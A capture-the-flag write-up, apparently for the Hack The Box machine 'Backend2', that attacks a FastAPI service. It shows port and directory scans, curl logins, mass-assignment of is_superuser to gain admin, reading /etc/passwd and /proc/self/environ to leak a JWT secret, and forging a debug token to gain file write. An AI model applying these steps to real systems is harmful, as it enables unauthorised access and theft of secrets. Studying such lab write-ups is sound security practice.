## RUSTSCAN:
`PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZBURYGCLr4lZI1F55bUh/6vKCfmeGumtAhhNrg9lH4UNDB/wCjPbD+xovPp3UdbrOgNdqTCdZcOk5rQDyRK2YH6tq8NlP59myIQV/zXC9WQnhxn131jf/KlW78vzWaLfMU+m52e1k+YpomT5PuSMG8EhGwE5bL4o0Jb8Unafn13CJKZ1oj3awp31fRJDzYGhTjl910PROJAzlOQinxRYdUkc4ZT0qZRohNlecGVsKPpP+2Ql+gVuusUEQt7gPFPBNKw3aLtbLVTlgEW09RB9KZe6Fuh8JszZhlRpIXDf9b2O0rINAyek8etQyFFfxkDBVueZA50wjBjtgOtxLRkvfqlxWS8R75Urz8AR2Nr23AcAGheIfYPgG8HzBsUuSN5fI8jsBCekYf/ZjPA/YDM4aiyHbUWfCyjTqtAVTf3P4iqbEkw9DONGeohBlyTtEIN7pY3YM5X3UuEFIgCjlqyjLw6QTL4cGC5zBbrZml7eZQTcmgzfU6pu220wRo5GtQ3U=
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZPKXFj3JfSmJZFAHDyqUDFHLHBRBRvlesLRVAqq0WwRFbeYdKwVIVv0DBufhYXHHcUSsBRw3/on9QM24kymD0=
|   256 2221e9f485908745161f733641ee3b32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDIBMvrXLaYc6DXKPZaypaAv4yZ3DNLe1YaBpbpB8aY
80/tcp open  http    syn-ack ttl 63 uvicorn
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     date: Fri, 17 Feb 2023 12:19:25 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest:
|     HTTP/1.1 200 OK
|     date: Fri, 17 Feb 2023 12:19:14 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC Api v2.0"}
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     date: Fri, 17 Feb 2023 12:19:20 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
| http-methods:
|_  Supported Methods: GET
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json)`
* * *
## SSH:
So far we can't do anything without a proper username/password. We may wanna come back later...
* * *
## HTTP:
Loggin into  website we can see that this should be an upgrade from Backend machine with UHC app version 2.0:
![591a51db1ea758d2088e929799eba257.png](../../_resources/591a51db1ea758d2088e929799eba257.png)

We can check if there are any other subdomains, but none are available which makes our life easier:
![48e895087679bb97bfd515ea65a01e8b.png](../../_resources/48e895087679bb97bfd515ea65a01e8b.png)

Now we must do a Webdirectory fuzzing in order to find all the API values in the path:
`Target: http://backend2.htb/
[13:39:58] Starting:
[13:40:19] 200 -   19B  - /api
[13:40:19] 307 -    0B  - /api/  ->  http://backend2.htb/api
[13:40:19] 200 -   32B  - /api/v1
[13:40:19] 307 -    0B  - /api/v1/  ->  http://backend2.htb/api/v1
[13:40:27] 401 -   30B  - /docs
[13:40:27] 307 -    0B  - /docs/  ->  http://backend2.htb/docs
[13:40:40] 401 -   30B  - /openapi.json
Task Completed`

We find some users and same user and admin:
`Target: http://backend2.htb/
[13:44:00] Starting: api/v1/
[13:44:14] 307 -    0B  - /api/v1/admin  ->  http://backend2.htb/api/v1/admin/
[13:44:15] 401 -   30B  - /api/v1/admin/
[13:44:58] 422 -  104B  - /api/v1/user/admin
[13:44:58] 422 -  104B  - /api/v1/user/admin.php
[13:44:58] 307 -    0B  - /api/v1/user/login/  ->  http://backend2.htb/api/v1/user/login
[13:44:58] 422 -  104B  - /api/v1/user/login.aspx
[13:44:58] 422 -  104B  - /api/v1/user/login.jsp
[13:44:58] 422 -  104B  - /api/v1/user/login.php
[13:44:58] 200 -  175B  - /api/v1/user/1
[13:44:58] 200 -    4B  - /api/v1/user/0d
[13:44:58] 200 -  176B  - /api/v1/user/2
[13:44:58] 200 -  178B  - /api/v1/user/3
[13:44:58] 422 -  104B  - /api/v1/user/login.html
[13:44:58] 422 -  104B  - /api/v1/user/login.js
[13:44:58] 422 -  104B  - /api/v1/user/signup
`

We can find the Admin:
![055325e0a48e1ef21de76e623245919e.png](../../_resources/055325e0a48e1ef21de76e623245919e.png)
The Guest:
![55630b111035792c74e1925f8d9e7028.png](../../_resources/55630b111035792c74e1925f8d9e7028.png)
And some other users?
![92a9462c6000ac7a204b63f6ddb878ae.png](../../_resources/92a9462c6000ac7a204b63f6ddb878ae.png)
![d2fbe52a5f4853ecf6c1ec151f596637.png](../../_resources/d2fbe52a5f4853ecf6c1ec151f596637.png)
![05031302799e5bfc1d97d46e000853e8.png](../../_resources/05031302799e5bfc1d97d46e000853e8.png)

From the previous picture seems like we have /login and /signup as well but judging by error i guess we have to query it via POST JSON request in Burp...
If we try to FUZZ for /api/v1/user parameters with FFUF tool in POST mode we have to match all HTTP codes but filterout the false positive ones 405:
![2199b620138229b2c8c66710a0b68362.png](../../_resources/2199b620138229b2c8c66710a0b68362.png)

Now we should try to explore the signup function:
![994f5df4b0d396abc9aea1c2a66f7492.png](../../_resources/994f5df4b0d396abc9aea1c2a66f7492.png)
Leaving the request as it is with GET he is complaining about a missed parameter in path:
![e70f6678591a7f3f243006c4d013ee64.png](../../_resources/e70f6678591a7f3f243006c4d013ee64.png)
![96f46e91a830e7f27b35445c9e9a1691.png](../../_resources/96f46e91a830e7f27b35445c9e9a1691.png)

Both integers and strings are not accepted, what if we use POST instead?
![40697b0ba7be13dcd6ee1b72b7efb49b.png](../../_resources/40697b0ba7be13dcd6ee1b72b7efb49b.png)

Ok now we got another error message, now we know POST request is expecting some values in JSON format into the body... Sending a dummy value formatted as JSON into body responds us with an error that indicated what we need to use, EMAIL and PASSWORD into body.
![9114dc8cfb3fd4e0bd7641099b5bb6e9.png](../../_resources/9114dc8cfb3fd4e0bd7641099b5bb6e9.png)

Now we should be confident to add our user:
![2168b13c62964eba847486127bc94b32.png](../../_resources/2168b13c62964eba847486127bc94b32.png)

We got success but now we should see if we have our user into DB and scrolling to Index n12 we find our user:
![789bf529f5ea8c8e6d04f9e9a0bdb005.png](../../_resources/789bf529f5ea8c8e6d04f9e9a0bdb005.png)

Now we have to explore the /login function in order to login, and we will do it again from Burpsuite. Lauching a void request to /login complains about a missing parameter into path:
![7cda8b75408920a6c5c055d95a3c9ed1.png](../../_resources/7cda8b75408920a6c5c055d95a3c9ed1.png)

But shipping both integers and strings are not helping:
![da30d2da836578f57da809410e3e22bd.png](../../_resources/da30d2da836578f57da809410e3e22bd.png)
![e8b8d888bd3b30bb61c3d834e0a7e207.png](../../_resources/e8b8d888bd3b30bb61c3d834e0a7e207.png)

What about using a POST method instead?
![509d301251484d164873ea6bdf670d52.png](../../_resources/509d301251484d164873ea6bdf670d52.png)

Now we know that BODY presumabilty in JSON format is expecting username and password so let's try:
![e53949edbc3eb96463f6785d53442d46.png](../../_resources/e53949edbc3eb96463f6785d53442d46.png)

And seems like it's not working, but what about trying to send it as normal HTTP POST request instead in URL format?
![88473e2d33cc0683dc53c774f05b60de.png](../../_resources/88473e2d33cc0683dc53c774f05b60de.png)
Still nothing, but what about use CURL instead?
`┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# curl -X POST -d 'username=yovecio@backend2.htb&password=Coglione1!' http://backend2.htb/api/v1/user/login
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc3MzMxNzc0LCJpYXQiOjE2NzY2NDA1NzQsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6ImFiZWE4ZGM2LWYwZDUtNDliZC1hYzk4LTYzYTBkYTQ3MjUyOCJ9.xNKch1WyoQ6VBgGS8tqxBLKQr2Swj9hnlJKGvG10kWQ","token_type":"bearer"}`

Yeah we got the token! Now we can use this service to check if it's a JWT token: https://jwt.io
![99d79b7d2779ba618487099429a513da.png](../../_resources/99d79b7d2779ba618487099429a513da.png)

We see that our ID is 12 and we are not admin for the moment... Now we shall add the JWT token to our session so we can login into /docs. We can do it by using a Browser Plugin or use a custom pluging for Burpsuite that will hardcode the token manually to every request.. https://burpsuite.guide/extensions/add-custom-header/
![fa43849d387ec8460c6b00198a7813c6.png](../../_resources/fa43849d387ec8460c6b00198a7813c6.png)
![96a1fb0725ea5053f339db2d3e556e62.png](../../_resources/96a1fb0725ea5053f339db2d3e556e62.png)

This should append the JWT token into header for every page what passes thru the Proxy in Burp. Let's surf to /docs so we can check:
![cc157111dc42d3863006fded8af867d8.png](../../_resources/cc157111dc42d3863006fded8af867d8.png)

Baam! Now that we are in, we can try to reset the password of one of the accounts? First we need to grab all the informations:
![86313b9f55f5ea72e07e681715402852.png](../../_resources/86313b9f55f5ea72e07e681715402852.png)
But it's not working:
![cae3670b0eba24b8177f495cc613b78c.png](../../_resources/cae3670b0eba24b8177f495cc613b78c.png)

Now here i had to check for tips, and the fuction Edit Profile is interesting, basically is editing the profile string:
![88c7971b1e30c544dab49d3a10d86169.png](../../_resources/88c7971b1e30c544dab49d3a10d86169.png)

Where for our account was empty but for ID 1 was instead:
![e470261ef579ddfa2918417f4390315e.png](../../_resources/e470261ef579ddfa2918417f4390315e.png)

What if we use same string in our profile?
![666ae22b9d4f61671fa6b5542288ec7b.png](../../_resources/666ae22b9d4f61671fa6b5542288ec7b.png)

yes is working as expected, but can we see the change?
![78f29e756cb26504f6704aea83816ca6.png](../../_resources/78f29e756cb26504f6704aea83816ca6.png)

Ok good, can we see if that is seeing it as Admin from Admin check function?
Before:
![3dac5efc86505dbc06b7d3c3d3ed9f3f.png](../../_resources/3dac5efc86505dbc06b7d3c3d3ed9f3f.png)
After:
![89a3517717bf8adb651b23e095ee5028.png](../../_resources/89a3517717bf8adb651b23e095ee5028.png)

Ok so we aren't  Admins.. So here i was out of ideas and I checked for tips on web and apparently we could exploit the same function by editing the parameter is_admin to our profile...
![6fc0fe1df7b133f6908494e26dfb7c06.png](../../_resources/6fc0fe1df7b133f6908494e26dfb7c06.png)

Seems like having only the is_admin is not working but what if we add profile and then is_superuser? Response seems yes, which mean that profile must be there but then the rest was processed as well...
![d1210005115f94dac1bc8e859b27331d.png](../../_resources/d1210005115f94dac1bc8e859b27331d.png)

Let's check our profile again now:
![173c7d0ce3306ef6fe42ea5d32bf6657.png](../../_resources/173c7d0ce3306ef6fe42ea5d32bf6657.png)

Seems right, so what about the check function:
![382d11683f31f40441dc4fcfc92576b8.png](../../_resources/382d11683f31f40441dc4fcfc92576b8.png)

No but i guess is cached and we need to login again with a new token!
`┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# curl -X POST -d 'username=yovecio@backend2.htb&password=Coglione1!' http://backend2.htb/api/v1/user/login
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc3MzM0NTQzLCJpYXQiOjE2NzY2NDMzNDMsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYWJlYThkYzYtZjBkNS00OWJkLWFjOTgtNjNhMGRhNDcyNTI4In0.A9-Kje6QqnboSYZzp8qdUsNdj72PhSgc_E1ocwZ4t7c","token_type":"bearer"}`

Now let's edit the token into Burpsuite and login back:
![c77941808a3b66fb9c240268c65bb2a5.png](../../_resources/c77941808a3b66fb9c240268c65bb2a5.png)

Now let's check againg user info:
![0d5c32de8adef8d1af1bd9592b04af47.png](../../_resources/0d5c32de8adef8d1af1bd9592b04af47.png)

So far is good, but what about the check function?
![00f75dbe94b316a7d2221b22a8796104.png](../../_resources/00f75dbe94b316a7d2221b22a8796104.png)

Hurra! Now that we are admin we should be able to grab first flag:
![28f5ef49b73274d6f1aec5b414250c53.png](../../_resources/28f5ef49b73274d6f1aec5b414250c53.png)

Now we can't run any cmd since the function is not more available but we can start by reading some files like /etc/passwd but it keeps failing then i missed that filename must be base64 encoded?
![d35e0633a8a02e5de0bddd270f11995d.png](../../_resources/d35e0633a8a02e5de0bddd270f11995d.png)

And it's working like that:
![833f42f63eadf41c07ca285af57250b4.png](../../_resources/833f42f63eadf41c07ca285af57250b4.png)

We know that here there is /home/htb and root.. So we can try to read /home/htb/user.txt
When we try to write a file(same here with B64 encoding) we get the error that we are missing debug permissions:
![1bd5c2c43586a4bfaf108ce542d61830.png](../../_resources/1bd5c2c43586a4bfaf108ce542d61830.png)

So if we read the environmental path under /proc/self/environ:
![f40c11bf0407f795304496de2eca855b.png](../../_resources/f40c11bf0407f795304496de2eca855b.png)

We can see that is pointing towards /home/htb/app/main.py:
![82a758f088d254607a5ec10c4e3f7db8.png](../../_resources/82a758f088d254607a5ec10c4e3f7db8.png)

From the code snippet we can see some imports done into the Python code of the main.py:
`import api_router\nfrom app.core.config import settings\n\nfrom app.api `
Reading /home/htb/app/api/v1/api.py:
![17d96b742d43345e4e456398d936986e.png](../../_resources/17d96b742d43345e4e456398d936986e.png)
We can even read the api endpoinds for admin:
![52c9ffd36d781ff1cc411765ab4d68a0.png](../../_resources/52c9ffd36d781ff1cc411765ab4d68a0.png)

And lastly we can read the config file /home/htb/app/core/config.py:
![ba4bb02f30cf078528ac8d49f55407ef.png](../../_resources/ba4bb02f30cf078528ac8d49f55407ef.png)

But we se this time that the JWT secret is readed from OS Environment API_KEY so it must be the one found in /proc/self/environ:
`API_KEY=68b329da9893e34099c7d8ad5cb9c940`

 Now we can craft our token by adding debug:true in https://jwt.io/:
 ![66981ead8d7f7fc8f6b55f04757b77a3.png](../../_resources/66981ead8d7f7fc8f6b55f04757b77a3.png)
 
 In the picture we added the Debug and the API secret from enviromental variable...
 `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc3MzM0NTQzLCJpYXQiOjE2NzY2NDMzNDMsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJkZWJ1ZyI6dHJ1ZSwiZ3VpZCI6ImFiZWE4ZGM2LWYwZDUtNDliZC1hYzk4LTYzYTBkYTQ3MjUyOCJ9.L5iyB2ONXxqF_IrrZNPztOoHBwqhCMneFrWFGKScLtI`
 
 Now we must update the token into Burpsuite and login again so we can check if we now have write permissions:
 ![8959dfe05a89d2facdfb221753c2165c.png](../../_resources/8959dfe05a89d2facdfb221753c2165c.png)
 
 Good seems working, but we need to exploit this..
 Here I tried to write a txt file under /home/htb/test.txt with content Bajs. The filename/path is B64 encoded:
 ![b7ba727606a7b24569188443bd672bf2.png](../../_resources/b7ba727606a7b24569188443bd672bf2.png)
 
 We got succes but can we read the file?
 ![750b65e11ae1477c856b0c422aeb6b22.png](../../_resources/750b65e11ae1477c856b0c422aeb6b22.png)
 
 Here i had to check for tips mostly because i was tired and seems like we had to check manually all the files from /home/htb/app/api/v1/endpoints..
 Admin.py:
 ![b377d583fe6153b25bc7ef72ab109266.png](../../_resources/b377d583fe6153b25bc7ef72ab109266.png)
 User.py:
 `{
  "file": "from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -> Any:\n    if field.field_info.extra.get(\"hidden_from_schema\", False):\n        raise schema.SkipField(f\"{field.name} field is being hidden\")\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\"/{user_id}\", status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -> Any:\n    \"\"\"\n    Fetch a user by ID\n    \"\"\"\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\"/{user_id}/edit\")\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -> Any:\n    \"\"\"\n    Edit the profile of a user\n    \"\"\"\n    u = db.query(User).filter(User.id == token['sub']).first()\n    if token['is_superuser'] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token['sub']).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return {\"result\": \"true\"}\n        else:\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\n\n@router.put(\"/{user_id}/password\")\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -> Any:\n    \"\"\"\n    Update the password of a user\n    \"\"\"\n    u = db.query(User).filter(User.id == token['sub']).first()\n    if token['is_superuser'] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token['sub']).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return {\"result\": \"true\"}\n        else:\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\n\n@router.post(\"/login\")\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -> Any:\n    \"\"\"\n    Get the JWT for a user with data from OAuth2 request form body.\n    \"\"\"\n    \n    timestamp = datetime.now().strftime(\"%m/%d/%Y, %H:%M:%S\")\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\"auth.log\", \"a\") as f:\n            f.write(f\"{timestamp} - Login Failure for {form_data.username}\\n\")\n        raise HTTPException(status_code=400, detail=\"Incorrect username or password\")\n    \n    with open(\"auth.log\", \"a\") as f:\n            f.write(f\"{timestamp} - Login Success for {form_data.username}\\n\")\n\n    return {\n        \"access_token\": create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \"token_type\": \"bearer\",\n    }\n\n@router.post(\"/signup\", status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -> Any:\n    \"\"\"\n    Create new user without the need to be logged in.\n    \"\"\"\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\"The user with this username already exists in the system\",\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n"
}`
 





* * *